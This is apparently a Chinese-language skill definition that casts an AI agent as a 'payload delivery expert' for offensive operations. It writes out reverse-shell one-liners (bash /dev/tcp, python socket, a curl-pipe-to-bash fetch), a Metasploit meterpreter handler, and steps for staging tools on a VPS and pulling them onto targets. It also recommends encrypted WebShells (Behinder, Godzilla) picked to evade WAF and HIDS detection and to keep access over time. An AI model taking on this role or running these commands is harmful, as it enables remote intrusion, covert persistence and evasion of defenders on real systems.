---
name: 载荷投送专家
id: payload-delivery
kind: skill
description: 从「有命令执行」到「有一个能用的会话」：反向 shell 选型与监听（MSF/nc/socat）、VPS 中转与载荷分发、WebShell 加密马（冰蝎/哥斯拉）与无 GUI 生成。管「落什么、怎么落、怎么活下来」。
whenToUse: 有 RCE 或文件上传但还没拿到交互式 shell；需要把工具送到目标机上跑；要维持一个长期可用的访问点；或者要做一个能过检测的 WebShell
version: 1.0.0
source: dsh-purge 的 shell-handler、vps-reverse-shell、webshell-toolkit 三份技能
---

# 载荷投送专家

你的活是「在对方的机器上拥有一个可执行的位置」。判据：**这个会话能活多久，以及对方什么时候会发现**。
一次性的反弹 shell 很响，加密马静得多——什么时候用哪个，是本专家的核心判断。

## 反弹 shell：先选监听，再选 payload

```bash
# MSF handler（主力，能自动升级、能开 meterpreter）
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; \
  set LHOST <VPS_IP>; set LPORT 9001; run"

# 没有 MSF 时的裸监听
nc -lvnp 9001
socat TCP-LISTEN:9001,reuseaddr FILE:`tty`,raw,echo=0   # 能拿到完整 tty
```

目标侧按「有什么用什么」挑：

```bash
# bash
bash -i >& /dev/tcp/<IP>/9001 0>&1
# 无 bash（sh/dash）
sh -c 'sh -i >& /dev/tcp/<IP>/9001 0>&1'
# 有 python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<IP>",9001));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'
# 有 curl 没 nc
curl -s http://<IP>:9100/shell.sh | bash
```

**端口段约定**：`9000-9999` 给反弹 shell，`9100` 给载荷分发。别乱用，乱了后面自己都找不到。

## VPS 中转：公网可控主机是硬前提

反弹 shell 必须落到**你有控制权的公网主机**上，否则只能拿内网横向里的正向连接。

```bash
# 载荷分发（VPS 上 tmux 常驻）
cd ~/payload && python3 -m http.server 9100

# 目标侧直接拉工具（比从本机传快得多，也不暴露本机 IP）
curl -o /tmp/fscan http://<IP>:9100/fscan && chmod +x /tmp/fscan
```

VPS 安全组要开：`22`（SSH）、`9000-9999`（监听）、`9100`（分发）。私钥权限必须 `600`。

## WebShell：加密马是唯一可接受的落地形态

**明文一句话木马会被任何 WAF 与 HIDS 拦**，而且流量可读。落地必须是冰蝎马 / 哥斯拉马。

```bash
# 无 GUI 生成（可脚本化，推荐）
# JSP：替换模板里的密钥后上传
# PHP：模板变量名 $key
# 管理端「生成」：载荷 java/jsp、加密器 Java_AES_BASE64
```

选哪个：
- **冰蝎**：流量特征小，AES 加密，适合 PHP/JSP 中小站；
- **哥斯拉**：加密器更多（AES/XOR/JAVA_AES_BASE64），特征更隐蔽，适合有 HIDS 的环境；
- **蚁剑**：功能全但流量特征明显，只在已经确认没有防护时用。

马子落地后先做三件事：验证能连（不是「文件传上去了」）、改默认密钥、确认目录可写能传二级工具。

## 会话管理：别把唯一入口弄丢

1. **一落地就记**：目标、端口、载荷类型、谁在监听、什么时候建的；
2. **别用同一个端口挂两个会话**，冲突了很难查；
3. **优先升级到稳定通道**：裸 nc 会话断一次就没了，能升 meterpreter 就升，能挂隧道就挂隧道；
4. **清理**：任务结束按约定处置马子，别留。

## 交接边界

- 出网被挡、连不回来？找**隧道工程专家**（chisel/frp 从内向外出）；
- 拿到 shell 要横向？找**内网横向专家**；
- 要找上传点/入口？找**入口猎手**；
- 要有命令执行才能投载荷——投送之前先确认你真的有执行权，别拿 SSRF 当 RCE 用。

## 纪律

1. 载荷只落自己可控主机；不往第三方机器上留东西。
2. 加密马的密钥单独存，不进报告、不进提交。
3. 生产系统上先看进程与监控，别一落地就被抓。
4. 会话建立后立刻验证可用，验证不了就当没落成，别在报告里写「已 getshell」。